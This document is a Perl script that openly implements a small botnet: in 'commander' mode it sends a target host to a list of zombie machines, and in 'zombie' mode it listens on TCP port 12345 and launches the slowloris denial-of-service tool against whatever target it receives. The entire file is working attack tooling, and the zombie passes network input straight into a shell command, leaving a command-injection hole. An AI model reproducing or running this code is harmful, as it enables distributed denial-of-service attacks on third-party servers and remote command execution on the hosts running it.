#!/usr/bin/perl -w
#
#

use Getopt::Std;
use IO::Socket::INET;
use Net::Address::IP::Local;
use strict;

our($opt_c, $opt_z, $opt_f);
getopts('zcf:');

if($opt_c && $opt_z) {
    die "Please select mode for $0 (commander or zombie)!!!\n";
} elsif($opt_c && $opt_f) {
    print "This is commander mode!!!\n";
    ### Put Client Part ###
    my($ip, @ipList, $i, $pid, @childs, $target);
    print "Please input the target IP or Hostname:";
    while(<STDIN>) {
        $target = $_;
    }
    open(FH, $opt_f) or die "Plz provide the IP addr list!!!\n";
    while($ip = <FH>) {
        chomp $ip;
        push @ipList, $ip;
        #commander($ip);
    }
    for($i = 0; $i <= $#ipList; $i++) {
        $pid = fork();
        if($pid) {
            push @childs, $pid;
        } elsif($pid == 0) {
            commander($ipList[$i], $target);
        } else {
            die "Resources Not Available!!!\n";
        }
    }
    foreach (@childs) {
        waitpid($_,0 );
    }
} elsif($opt_z) {
    print "This is zombie mode!!!\n";
    ### Put Server Part ###
    zombie();
} else {
    die "Usage: perl $0 -f ipAddrList.txt -options!!!\n";
}

sub zombie {
    $| = 1;
    my $l_addr = Net::Address::IP::Local->public_ipv4;
    my $socket = new IO::Socket::INET (
        LocalHost => "$l_addr", 
        LocalPort => '12345', 
        Proto => 'tcp', 
        Listen => '5', 
        Reuse => '1'
    );
    die "Unable to create zombie process $!\n" unless $socket;
    while(1) {
        my $c_socket = $socket->accept();
        my $target = '';
        $c_socket->recv($target, 1024);
        system("/home/jieliau/Tools/slowloris.pl/slowloris.pl -dns $target");
    }
    $socket->close();
}

sub commander {
    my($ipAddr, $targetIP) = @_;
    $| = 1;
    my $socket = new IO::Socket::INET (
        PeerHost => "$ipAddr",
        PeerPort => '12345',
        Proto => 'tcp'
    );
    die "Unable to connect to $ipAddr: $!\n" unless $socket;
    #print "Target IP or HostName: ";
    ###while(<STDIN>) {
    ##    $socket->send($_);
    ##    print "Sending command to zombie!!!\n";
    ##    shutdown($socket, 1);
    ##}
    print "$targetIP\n";
    $socket->send($targetIP);
    print "Sending command to zombie!!!\n";
    shutdown($socket, 1);
    $socket->close();
}
